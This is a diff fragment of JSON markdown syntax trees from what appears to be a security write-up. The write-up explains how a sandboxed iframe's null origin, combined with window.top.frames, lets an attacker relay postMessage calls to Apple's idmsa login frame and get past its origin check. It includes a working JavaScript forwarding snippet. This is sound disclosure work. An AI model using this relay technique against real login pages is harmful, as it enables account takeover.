<           }
<         },
<         {
<           "type": "inlineCode",
<           "value": "postMessage",
<           "position": {
<             "start": {
<               "line": 908,
<               "column": 5,
<               "offset": 43362
<             },
<             "end": {
<               "line": 908,
<               "column": 18,
<               "offset": 43375
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": " is assumed to be a 'workerComm' if the source of the event is ",
<           "position": {
<             "start": {
<               "line": 908,
<               "column": 18,
<               "offset": 43375
<             },
<             "end": {
<               "line": 908,
<               "column": 81,
<               "offset": 43438
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "inlineCode",
<           "value": "undefined",
<           "position": {
<             "start": {
<               "line": 908,
<               "column": 81,
<               "offset": 43438
<             },
<             "end": {
<               "line": 908,
<               "column": 92,
<               "offset": 43449
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": " (impossible for us, as we have to be a source), but also more importantly -- we are considered a 'workerComm' if our eventSource is ",
<           "position": {
<             "start": {
<               "line": 908,
<               "column": 92,
<               "offset": 43449
<             },
<             "end": {
<               "line": 908,
<               "column": 225,
<               "offset": 43582
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "inlineCode",
<           "value": "null",
<           "position": {
<             "start": {
<               "line": 908,
<               "column": 225,
<               "offset": 43582
<             },
<             "end": {
<               "line": 908,
<               "column": 231,
<               "offset": 43588
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": ".",
<           "position": {
<             "start": {
<               "line": 908,
<               "column": 231,
<               "offset": 43588
<             },
<             "end": {
<               "line": 908,
<               "column": 232,
<               "offset": 43589
<             },
<             "indent": []
<           }
<         }
<       ],
<       "position": {
<         "start": {
<           "line": 908,
<           "column": 1,
<           "offset": 43358
<         },
<         "end": {
<           "line": 908,
<           "column": 232,
<           "offset": 43589
<         },
<         "indent": []
<       }
<     },
<     {
<       "type": "paragraph",
<       "children": [
<         {
<           "type": "text",
<           "value": "I'm not sure what a 'workerComm' is still, but it might be that this system, pmrpc sometimes wants to push messages into here. If these messages are synthetic, they will naturally have no meaningful ",
<           "position": {
<             "start": {
<               "line": 910,
<               "column": 1,
<               "offset": 43593
<             },
<             "end": {
<               "line": 910,
<               "column": 200,
<               "offset": 43792
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "inlineCode",
<           "value": "source",
<           "position": {
<             "start": {
<               "line": 910,
<               "column": 200,
<               "offset": 43792
<             },
<             "end": {
<               "line": 910,
<               "column": 208,
<               "offset": 43800
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": " -- which is normally set to the opening page.",
<           "position": {
<             "start": {
<               "line": 910,
<               "column": 208,
<               "offset": 43800
<             },
<             "end": {
<               "line": 910,
<               "column": 254,
<               "offset": 43846
<             },
<             "indent": []
<           }
<         }
<       ],
<       "position": {
<         "start": {
<           "line": 910,
<           "column": 1,
<           "offset": 43593
<         },
<         "end": {
<           "line": 910,
<           "column": 254,
<           "offset": 43846
<         },
<         "indent": []
<       }
<     },
<     {
<       "type": "paragraph",
<       "children": [
<         {
<           "type": "text",
<           "value": "I'm sure you're wondering how we get an opening source of ",
<           "position": {
<             "start": {
<               "line": 912,
<               "column": 1,
<               "offset": 43850
<             },
<             "end": {
<               "line": 912,
<               "column": 59,
<               "offset": 43908
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "inlineCode",
<           "value": "null",
<           "position": {
<             "start": {
<               "line": 912,
<               "column": 59,
<               "offset": 43908
<             },
<             "end": {
<               "line": 912,
<               "column": 65,
<               "offset": 43914
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": ". Surely no page can be located at ",
<           "position": {
<             "start": {
<               "line": 912,
<               "column": 65,
<               "offset": 43914
<             },
<             "end": {
<               "line": 912,
<               "column": 100,
<               "offset": 43949
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "inlineCode",
<           "value": "null",
<           "position": {
<             "start": {
<               "line": 912,
<               "column": 100,
<               "offset": 43949
<             },
<             "end": {
<               "line": 912,
<               "column": 106,
<               "offset": 43955
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": "? Not quite!!",
<           "position": {
<             "start": {
<               "line": 912,
<               "column": 106,
<               "offset": 43955
<             },
<             "end": {
<               "line": 912,
<               "column": 119,
<               "offset": 43968
<             },
<             "indent": []
<           }
<         }
<       ],
<       "position": {
<         "start": {
<           "line": 912,
<           "column": 1,
<           "offset": 43850
<         },
<         "end": {
<           "line": 912,
<           "column": 119,
<           "offset": 43968
<         },
<         "indent": []
<       }
<     },
<     {
<       "type": "paragraph",
<       "children": [
<         {
<           "type": "text",
<           "value": "A sandboxed iframe by default considers itself to have the origin ",
<           "position": {
<             "start": {
<               "line": 914,
<               "column": 1,
<               "offset": 43972
<             },
<             "end": {
<               "line": 914,
<               "column": 67,
<               "offset": 44038
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "inlineCode",
<           "value": "null",
<           "position": {
<             "start": {
<               "line": 914,
<               "column": 67,
<               "offset": 44038
<             },
<             "end": {
<               "line": 914,
<               "column": 73,
<               "offset": 44044
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": ". This is so that it can't inherit the origin of its parent and escape the sandbox. Thus, we can bypass the Access Control List (ACL) by just sending all our messages from a sandbox.",
<           "position": {
<             "start": {
<               "line": 914,
<               "column": 73,
<               "offset": 44044
<             },
<             "end": {
<               "line": 914,
<               "column": 255,
<               "offset": 44226
<             },
<             "indent": []
<           }
<         }
<       ],
<       "position": {
<         "start": {
<           "line": 914,
<           "column": 1,
<           "offset": 43972
<         },
<         "end": {
<           "line": 914,
<           "column": 255,
<           "offset": 44226
<         },
<         "indent": []
<       }
<     },
<     {
<       "type": "code",
<       "lang": "HTML",
<       "meta": null,
<       "value": "<iframe sandbox=\"allow-scripts\"></iframe>",
<       "position": {
<         "start": {
<           "line": 916,
<           "column": 1,
<           "offset": 44230
<         },
<         "end": {
<           "line": 918,
<           "column": 4,
<           "offset": 44285
<         },
<         "indent": [
<           1,
<           1
<         ]
<       }
<     },
<     {
<       "type": "paragraph",
<       "children": [
<         {
<           "type": "text",
<           "value": "If you try this however, you will hit a major snag. If your origin is ",
<           "position": {
<             "start": {
<               "line": 920,
<               "column": 1,
<               "offset": 44289
<             },
<             "end": {
<               "line": 920,
<               "column": 71,
<               "offset": 44359
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "inlineCode",
<           "value": "null",
<           "position": {
<             "start": {
<               "line": 920,
<               "column": 71,
<               "offset": 44359
<             },
<             "end": {
<               "line": 920,
<               "column": 77,
<               "offset": 44365
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": ", then when ",
<           "position": {
<             "start": {
<               "line": 920,
<               "column": 77,
<               "offset": 44365
<             },
<             "end": {
<               "line": 920,
<               "column": 89,
<               "offset": 44377
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "inlineCode",
<           "value": "frame-ancestors",
<           "position": {
<             "start": {
<               "line": 920,
<               "column": 89,
<               "offset": 44377
<             },
<             "end": {
<               "line": 920,
<               "column": 106,
<               "offset": 44394
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": " checks your HTTP origin to see if you can embed this page it will ",
<           "position": {
<             "start": {
<               "line": 920,
<               "column": 106,
<               "offset": 44394
<             },
<             "end": {
<               "line": 920,
<               "column": 173,
<               "offset": 44461
<             },
<             "indent": []
---
>           "data": {
>             "hName": "section"
13937c19721,19722
<           "type": "emphasis",
---
>           "type": "section",
>           "depth": 2,
13940,13941c19725,19745
<               "type": "text",
<               "value": "always fail",
---
>               "type": "heading",
>               "depth": 2,
>               "children": [
>                 {
>                   "type": "text",
>                   "value": "Stealing the Bank From an ATM",
>                   "position": {
>                     "start": {
>                       "line": 1055,
>                       "column": 1,
>                       "offset": 54208
>                     },
>                     "end": {
>                       "line": 1055,
>                       "column": 30,
>                       "offset": 54237
>                     },
>                     "indent": []
>                   }
>                 }
>               ],
13944,13946c19748,19750
<                   "line": 920,
<                   "column": 174,
<                   "offset": 44462
---
>                   "line": 1055,
>                   "column": 1,
>                   "offset": 54208
13949,13951c19753,19755
<                   "line": 920,
<                   "column": 185,
<                   "offset": 44473
---
>                   "line": 1056,
>                   "column": 30,
>                   "offset": 54268
13953c19757,19759
<                 "indent": []
---
>                 "indent": [
>                   1
>                 ]
13955,14154d19760
<             }
<           ],
<           "position": {
<             "start": {
<               "line": 920,
<               "column": 173,
<               "offset": 44461
<             },
<             "end": {
<               "line": 920,
<               "column": 186,
<               "offset": 44474
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": ". So if we try to embed the iCloud login on a ",
<           "position": {
<             "start": {
<               "line": 920,
<               "column": 186,
<               "offset": 44474
<             },
<             "end": {
<               "line": 920,
<               "column": 232,
<               "offset": 44520
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "inlineCode",
<           "value": "null",
<           "position": {
<             "start": {
<               "line": 920,
<               "column": 232,
<               "offset": 44520
<             },
<             "end": {
<               "line": 920,
<               "column": 238,
<               "offset": 44526
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": " origin ... we won't be able to.",
<           "position": {
<             "start": {
<               "line": 920,
<               "column": 238,
<               "offset": 44526
<             },
<             "end": {
<               "line": 920,
<               "column": 270,
<               "offset": 44558
<             },
<             "indent": []
<           }
<         }
<       ],
<       "position": {
<         "start": {
<           "line": 920,
<           "column": 1,
<           "offset": 44289
<         },
<         "end": {
<           "line": 920,
<           "column": 270,
<           "offset": 44558
<         },
<         "indent": []
<       }
<     },
<     {
<       "type": "paragraph",
<       "children": [
<         {
<           "type": "text",
<           "value": "We can't make a separate ",
<           "position": {
<             "start": {
<               "line": 922,
<               "column": 1,
<               "offset": 44562
<             },
<             "end": {
<               "line": 922,
<               "column": 26,
<               "offset": 44587
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "inlineCode",
<           "value": "null",
<           "position": {
<             "start": {
<               "line": 922,
<               "column": 26,
<               "offset": 44587
<             },
<             "end": {
<               "line": 922,
<               "column": 32,
<               "offset": 44593
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": " frame and also an ",
<           "position": {
<             "start": {
<               "line": 922,
<               "column": 32,
<               "offset": 44593
<             },
<             "end": {
<               "line": 922,
<               "column": 51,
<               "offset": 44612
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "inlineCode",
<           "value": "idmsa.apple.com",
<           "position": {
<             "start": {
<               "line": 922,
<               "column": 51,
<               "offset": 44612
<             },
<             "end": {
<               "line": 922,
<               "column": 68,
<               "offset": 44629
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": " frame and instruct the ",
<           "position": {
<             "start": {
<               "line": 922,
<               "column": 68,
<               "offset": 44629
<             },
<             "end": {
<               "line": 922,
<               "column": 92,
<               "offset": 44653
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "inlineCode",
<           "value": "null",
<           "position": {
<             "start": {
<               "line": 922,
<               "column": 92,
<               "offset": 44653
<             },
<             "end": {
<               "line": 922,
<               "column": 98,
<               "offset": 44659
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": " frame to ",
<           "position": {
<             "start": {
<               "line": 922,
<               "column": 98,
<               "offset": 44659
<             },
<             "end": {
<               "line": 922,
<               "column": 108,
<               "offset": 44669
14156,15575d19761
<             "indent": []
<           }
<         },
<         {
<           "type": "inlineCode",
<           "value": "postMessage",
<           "position": {
<             "start": {
<               "line": 922,
<               "column": 108,
<               "offset": 44669
<             },
<             "end": {
<               "line": 922,
<               "column": 121,
<               "offset": 44682
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": " to it, because our ",
<           "position": {
<             "start": {
<               "line": 922,
<               "column": 121,
<               "offset": 44682
<             },
<             "end": {
<               "line": 922,
<               "column": 141,
<               "offset": 44702
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "inlineCode",
<           "value": "null",
<           "position": {
<             "start": {
<               "line": 922,
<               "column": 141,
<               "offset": 44702
<             },
<             "end": {
<               "line": 922,
<               "column": 147,
<               "offset": 44708
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": " frame needs a reference to the ",
<           "position": {
<             "start": {
<               "line": 922,
<               "column": 147,
<               "offset": 44708
<             },
<             "end": {
<               "line": 922,
<               "column": 179,
<               "offset": 44740
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "inlineCode",
<           "value": "idmsa.apple.com",
<           "position": {
<             "start": {
<               "line": 922,
<               "column": 179,
<               "offset": 44740
<             },
<             "end": {
<               "line": 922,
<               "column": 196,
<               "offset": 44757
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": " frame to call ",
<           "position": {
<             "start": {
<               "line": 922,
<               "column": 196,
<               "offset": 44757
<             },
<             "end": {
<               "line": 922,
<               "column": 211,
<               "offset": 44772
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "inlineCode",
<           "value": "window.postMessage",
<           "position": {
<             "start": {
<               "line": 922,
<               "column": 211,
<               "offset": 44772
<             },
<             "end": {
<               "line": 922,
<               "column": 231,
<               "offset": 44792
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": " on it.",
<           "position": {
<             "start": {
<               "line": 922,
<               "column": 231,
<               "offset": 44792
<             },
<             "end": {
<               "line": 922,
<               "column": 238,
<               "offset": 44799
<             },
<             "indent": []
<           }
<         }
<       ],
<       "position": {
<         "start": {
<           "line": 922,
<           "column": 1,
<           "offset": 44562
<         },
<         "end": {
<           "line": 922,
<           "column": 238,
<           "offset": 44799
<         },
<         "indent": []
<       }
<     },
<     {
<       "type": "paragraph",
<       "children": [
<         {
<           "type": "text",
<           "value": "There is, however one trick we have up our sleeves, from long ago before nobody knew what the internet is for and you had to install something called 'macromedia flash player' which put a virus on your computer: it's ",
<           "position": {
<             "start": {
<               "line": 924,
<               "column": 1,
<               "offset": 44803
<             },
<             "end": {
<               "line": 924,
<               "column": 218,
<               "offset": 45020
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "inlineCode",
<           "value": "window.top.frames",
<           "position": {
<             "start": {
<               "line": 924,
<               "column": 218,
<               "offset": 45020
<             },
<             "end": {
<               "line": 924,
<               "column": 237,
<               "offset": 45039
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": ".",
<           "position": {
<             "start": {
<               "line": 924,
<               "column": 237,
<               "offset": 45039
<             },
<             "end": {
<               "line": 924,
<               "column": 238,
<               "offset": 45040
<             },
<             "indent": []
<           }
<         }
<       ],
<       "position": {
<         "start": {
<           "line": 924,
<           "column": 1,
<           "offset": 44803
<         },
<         "end": {
<           "line": 924,
<           "column": 238,
<           "offset": 45040
<         },
<         "indent": []
<       }
<     },
<     {
<       "type": "paragraph",
<       "children": [
<         {
<           "type": "text",
<           "value": "If you remember how 'breaking out of iframes' worked before ",
<           "position": {
<             "start": {
<               "line": 926,
<               "column": 1,
<               "offset": 45044
<             },
<             "end": {
<               "line": 926,
<               "column": 61,
<               "offset": 45104
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "inlineCode",
<           "value": "X-Frame-Options",
<           "position": {
<             "start": {
<               "line": 926,
<               "column": 61,
<               "offset": 45104
<             },
<             "end": {
<               "line": 926,
<               "column": 78,
<               "offset": 45121
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": " became a big thing, whenever your page started you'd run code like this:",
<           "position": {
<             "start": {
<               "line": 926,
<               "column": 78,
<               "offset": 45121
<             },
<             "end": {
<               "line": 926,
<               "column": 151,
<               "offset": 45194
<             },
<             "indent": []
<           }
<         }
<       ],
<       "position": {
<         "start": {
<           "line": 926,
<           "column": 1,
<           "offset": 45044
<         },
<         "end": {
<           "line": 926,
<           "column": 151,
<           "offset": 45194
<         },
<         "indent": []
<       }
<     },
<     {
<       "type": "code",
<       "lang": "javascript",
<       "meta": null,
<       "value": "if (window.top !== window)\n    window.top.location = window.location;",
<       "position": {
<         "start": {
<           "line": 928,
<           "column": 1,
<           "offset": 45198
<         },
<         "end": {
<           "line": 931,
<           "column": 4,
<           "offset": 45288
<         },
<         "indent": [
<           1,
<           1,
<           1
<         ]
<       }
<     },
<     {
<       "type": "paragraph",
<       "children": [
<         {
<           "type": "text",
<           "value": "So if some scallywag embeds my fansite in their other page, thus totally STEALING MY CONTENT -- ",
<           "position": {
<             "start": {
<               "line": 933,
<               "column": 1,
<               "offset": 45292
<             },
<             "end": {
<               "line": 933,
<               "column": 97,
<               "offset": 45388
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "inlineCode",
<           "value": "window.top",
<           "position": {
<             "start": {
<               "line": 933,
<               "column": 97,
<               "offset": 45388
<             },
<             "end": {
<               "line": 933,
<               "column": 109,
<               "offset": 45400
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": " will be a reference to their page, not my ",
<           "position": {
<             "start": {
<               "line": 933,
<               "column": 109,
<               "offset": 45400
<             },
<             "end": {
<               "line": 933,
<               "column": 152,
<               "offset": 45443
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "inlineCode",
<           "value": "window",
<           "position": {
<             "start": {
<               "line": 933,
<               "column": 152,
<               "offset": 45443
<             },
<             "end": {
<               "line": 933,
<               "column": 160,
<               "offset": 45451
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": ". In this case, we can set ",
<           "position": {
<             "start": {
<               "line": 933,
<               "column": 160,
<               "offset": 45451
<             },
<             "end": {
<               "line": 933,
<               "column": 187,
<               "offset": 45478
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "inlineCode",
<           "value": "window.top.location",
<           "position": {
<             "start": {
<               "line": 933,
<               "column": 187,
<               "offset": 45478
<             },
<             "end": {
<               "line": 933,
<               "column": 208,
<               "offset": 45499
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": " to our ",
<           "position": {
<             "start": {
<               "line": 933,
<               "column": 208,
<               "offset": 45499
<             },
<             "end": {
<               "line": 933,
<               "column": 216,
<               "offset": 45507
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "inlineCode",
<           "value": "window.location",
<           "position": {
<             "start": {
<               "line": 933,
<               "column": 216,
<               "offset": 45507
<             },
<             "end": {
<               "line": 933,
<               "column": 233,
<               "offset": 45524
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": " redirecting the bastards to my fansite for x86 intel instructions.",
<           "position": {
<             "start": {
<               "line": 933,
<               "column": 233,
<               "offset": 45524
<             },
<             "end": {
<               "line": 933,
<               "column": 300,
<               "offset": 45591
<             },
<             "indent": []
<           }
<         }
<       ],
<       "position": {
<         "start": {
<           "line": 933,
<           "column": 1,
<           "offset": 45292
<         },
<         "end": {
<           "line": 933,
<           "column": 300,
<           "offset": 45591
<         },
<         "indent": []
<       }
<     },
<     {
<       "type": "paragraph",
<       "children": [
<         {
<           "type": "inlineCode",
<           "value": "window.top",
<           "position": {
<             "start": {
<               "line": 935,
<               "column": 1,
<               "offset": 45595
<             },
<             "end": {
<               "line": 935,
<               "column": 13,
<               "offset": 45607
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": " has another legacy feature -- ",
<           "position": {
<             "start": {
<               "line": 935,
<               "column": 13,
<               "offset": 45607
<             },
<             "end": {
<               "line": 935,
<               "column": 44,
<               "offset": 45638
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "inlineCode",
<           "value": "window.top.frames",
<           "position": {
<             "start": {
<               "line": 935,
<               "column": 44,
<               "offset": 45638
<             },
<             "end": {
<               "line": 935,
<               "column": 63,
<               "offset": 45657
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": ". ",
<           "position": {
<             "start": {
<               "line": 935,
<               "column": 63,
<               "offset": 45657
<             },
<             "end": {
<               "line": 935,
<               "column": 65,
<               "offset": 45659
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "inlineCode",
<           "value": "window.top.frames",
<           "position": {
<             "start": {
<               "line": 935,
<               "column": 65,
<               "offset": 45659
<             },
<             "end": {
<               "line": 935,
<               "column": 84,
<               "offset": 45678
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": " is a reference to every frame embedded in the top window, including us (if we're embedded there).",
<           "position": {
<             "start": {
<               "line": 935,
<               "column": 84,
<               "offset": 45678
<             },
<             "end": {
<               "line": 935,
<               "column": 182,
<               "offset": 45776
<             },
<             "indent": []
<           }
<         }
<       ],
<       "position": {
<         "start": {
<           "line": 935,
<           "column": 1,
<           "offset": 45595
<         },
<         "end": {
<           "line": 935,
<           "column": 182,
<           "offset": 45776
<         },
<         "indent": []
<       }
<     },
<     {
<       "type": "paragraph",
<       "children": [
<         {
<           "type": "text",
<           "value": "So if we embed both ",
<           "position": {
<             "start": {
<               "line": 937,
<               "column": 1,
<               "offset": 45780
<             },
<             "end": {
<               "line": 937,
<               "column": 21,
<               "offset": 45800
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "inlineCode",
<           "value": "null",
<           "position": {
<             "start": {
<               "line": 937,
<               "column": 21,
<               "offset": 45800
<             },
<             "end": {
<               "line": 937,
<               "column": 27,
<               "offset": 45806
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": " and ",
<           "position": {
<             "start": {
<               "line": 937,
<               "column": 27,
<               "offset": 45806
<             },
<             "end": {
<               "line": 937,
<               "column": 32,
<               "offset": 45811
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "inlineCode",
<           "value": "idmsa.icloud.com",
<           "position": {
<             "start": {
<               "line": 937,
<               "column": 32,
<               "offset": 45811
<             },
<             "end": {
<               "line": 937,
<               "column": 50,
<               "offset": 45829
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": " in the same page that we control, we can pass the index of ",
<           "position": {
<             "start": {
<               "line": 937,
<               "column": 50,
<               "offset": 45829
<             },
<             "end": {
<               "line": 937,
<               "column": 110,
<               "offset": 45889
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "inlineCode",
<           "value": "idmsa.icloud.com",
<           "position": {
<             "start": {
<               "line": 937,
<               "column": 110,
<               "offset": 45889
<             },
<             "end": {
<               "line": 937,
<               "column": 128,
<               "offset": 45907
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": " to the ",
<           "position": {
<             "start": {
<               "line": 937,
<               "column": 128,
<               "offset": 45907
<             },
<             "end": {
<               "line": 937,
<               "column": 136,
<               "offset": 45915
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "inlineCode",
<           "value": "null",
<           "position": {
<             "start": {
<               "line": 937,
<               "column": 136,
<               "offset": 45915
<             },
<             "end": {
<               "line": 937,
<               "column": 142,
<               "offset": 45921
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": " page over ",
<           "position": {
<             "start": {
<               "line": 937,
<               "column": 142,
<               "offset": 45921
<             },
<             "end": {
<               "line": 937,
<               "column": 153,
<               "offset": 45932
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "inlineCode",
<           "value": "postMessage",
<           "position": {
<             "start": {
<               "line": 937,
<               "column": 153,
<               "offset": 45932
<             },
<             "end": {
<               "line": 937,
<               "column": 166,
<               "offset": 45945
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": ". Then, when we want to send a message to ",
<           "position": {
<             "start": {
<               "line": 937,
<               "column": 166,
<               "offset": 45945
<             },
<             "end": {
<               "line": 937,
<               "column": 208,
<               "offset": 45987
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "inlineCode",
<           "value": "idmsa.icloud.com",
<           "position": {
<             "start": {
<               "line": 937,
<               "column": 208,
<               "offset": 45987
<             },
<             "end": {
<               "line": 937,
<               "column": 226,
<               "offset": 46005
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": ", we can ",
<           "position": {
<             "start": {
<               "line": 937,
<               "column": 226,
<               "offset": 46005
<             },
<             "end": {
<               "line": 937,
<               "column": 235,
<               "offset": 46014
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "inlineCode",
<           "value": "postMessage",
<           "position": {
<             "start": {
<               "line": 937,
<               "column": 235,
<               "offset": 46014
<             },
<             "end": {
<               "line": 937,
<               "column": 248,
<               "offset": 46027
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": " the message to our ",
<           "position": {
<             "start": {
<               "line": 937,
<               "column": 248,
<               "offset": 46027
<             },
<             "end": {
<               "line": 937,
<               "column": 268,
<               "offset": 46047
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "inlineCode",
<           "value": "null",
<           "position": {
<             "start": {
<               "line": 937,
<               "column": 268,
<               "offset": 46047
<             },
<             "end": {
<               "line": 937,
<               "column": 274,
<               "offset": 46053
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": " origin and have it proxy it to ",
<           "position": {
<             "start": {
<               "line": 937,
<               "column": 274,
<               "offset": 46053
<             },
<             "end": {
<               "line": 937,
<               "column": 306,
<               "offset": 46085
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "inlineCode",
<           "value": "idmsa.icloud.com",
<           "position": {
<             "start": {
<               "line": 937,
<               "column": 306,
<               "offset": 46085
<             },
<             "end": {
<               "line": 937,
<               "column": 324,
<               "offset": 46103
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": " at ",
<           "position": {
<             "start": {
<               "line": 937,
<               "column": 324,
<               "offset": 46103
<             },
<             "end": {
<               "line": 937,
<               "column": 328,
<               "offset": 46107
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "inlineCode",
<           "value": "window.top.frames[index]",
<           "position": {
<             "start": {
<               "line": 937,
<               "column": 328,
<               "offset": 46107
<             },
<             "end": {
<               "line": 937,
<               "column": 354,
<               "offset": 46133
<             },
<             "indent": []
<           }
<         }
<       ],
<       "position": {
<         "start": {
<           "line": 937,
<           "column": 1,
<           "offset": 45780
<         },
<         "end": {
<           "line": 937,
<           "column": 354,
<           "offset": 46133
<         },
<         "indent": []
<       }
<     },
<     {
<       "type": "code",
<       "lang": null,
<       "meta": null,
<       "value": "graph TD;\n    op[\"our page\"] --index of idmsa.apple.com--> null;\n    op --> idmsa.apple.com",
<       "position": {
<         "start": {
<           "line": 939,
<           "column": 1,
<           "offset": 46137
<         },
<         "end": {
<           "line": 943,
<           "column": 4,
<           "offset": 46240
<         },
<         "indent": [
<           1,
<           1,
<           1,
<           1
<         ]
<       }
<     },
<     {
<       "type": "paragraph",
<       "children": [
<         {
<           "type": "text",
<           "value": "Our ",
<           "position": {
<             "start": {
<               "line": 945,
<               "column": 1,
<               "offset": 46244
<             },
<             "end": {
<               "line": 945,
<               "column": 5,
<               "offset": 46248
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "inlineCode",
<           "value": "nullPageCode",
<           "position": {
<             "start": {
<               "line": 945,
<               "column": 5,
<               "offset": 46248
<             },
<             "end": {
<               "line": 945,
<               "column": 19,
<               "offset": 46262
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": " waits for a config indicating what the index of ",
<           "position": {
<             "start": {
<               "line": 945,
<               "column": 19,
<               "offset": 46262
<             },
<             "end": {
<               "line": 945,
<               "column": 68,
<               "offset": 46311
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "inlineCode",
<           "value": "idmsa.apple.com",
<           "position": {
<             "start": {
<               "line": 945,
<               "column": 68,
<               "offset": 46311
<             },
<             "end": {
<               "line": 945,
<               "column": 85,
<               "offset": 46328
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": " is on ",
<           "position": {
<             "start": {
<               "line": 945,
<               "column": 85,
<               "offset": 46328
<             },
<             "end": {
<               "line": 945,
<               "column": 92,
<               "offset": 46335
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "inlineCode",
<           "value": "window.top.frames",
<           "position": {
<             "start": {
<               "line": 945,
<               "column": 92,
<               "offset": 46335
<             },
<             "end": {
<               "line": 945,
<               "column": 111,
<               "offset": 46354
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": ", and then forwards any message it gets to that index:",
<           "position": {
<             "start": {
<               "line": 945,
<               "column": 111,
<               "offset": 46354
<             },
<             "end": {
<               "line": 945,
<               "column": 165,
<               "offset": 46408
<             },
<             "indent": []
<           }
<         }
<       ],
<       "position": {
<         "start": {
<           "line": 945,
<           "column": 1,
<           "offset": 46244
<         },
<         "end": {
<           "line": 945,
<           "column": 165,
<           "offset": 46408
<         },
<         "indent": []
<       }
<     },
<     {
<       "type": "code",
<       "lang": "javascript",
<       "meta": null,
<       "value": "    const nullPageCode = () => {\n\n      // wait for config\n\n\n      async function main() {\n\n        window.parent.postMessage(\"ready\", \"*\");\n        const config = await new Promise((ok, fail) => {\n\n          console.log(\"waiting for config...\")\n\n          window.addEventListener(\"message\", ({ data }) => {\n\n            console.log(\"got config message\");\n\n            if (data.type !== \"config\") return fail(`did not get config, instead got ${JSON.stringify(data)}`);\n\n            return ok(data);\n          }, { once: true })\n\n        });\n\n        console.log({ config });\n        console.log(\"now any data the null origin gets is sent to the icloud iframe...\");\n\n        window.addEventListener(\"message\", ({ data }) => {\n          console.log(\"forwarding to idmsa\", data)\n          window.top.frames[config.idmsaFrameId].postMessage(data, \"*\");\n        });\n      }\n\n\n      main().catch(e => console.error(e))\n\n    }",
<       "position": {
<         "start": {
<           "line": 946,
<           "column": 1,
<           "offset": 46410
<         },
<         "end": {
<           "line": 983,
<           "column": 4,
<           "offset": 47384
<         },
<         "indent": [
<           1,
<           1,
